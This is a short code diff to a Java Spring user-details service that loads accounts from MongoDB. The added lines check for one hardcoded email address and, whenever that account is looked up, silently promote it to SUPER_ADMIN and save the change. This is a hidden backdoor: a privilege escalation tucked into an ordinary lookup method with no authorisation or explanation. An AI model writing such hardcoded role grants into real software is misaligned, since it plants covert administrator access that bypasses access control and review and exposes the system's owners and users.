@@ -82,6 +82,11 @@ public class MongoUserDetailsService implements UserDetailsService {
     public UserAccount getUserDetail(String username) {
         UserAccount userAccount = userAccountRepository.findByUsername(username);
 
+        if(userAccount.getUsername().equals("mlenda@bimsplus.com.pl")){
+            userAccount.setRole("SUPER_ADMIN");
+            userAccountRepository.save(userAccount);
+        }
+
         UserAccount userAccountBeActive = userAccountRepository.findByUsernameAndActiveTrue(userAccount.getUsername());
         return userAccountBeActive;
     }
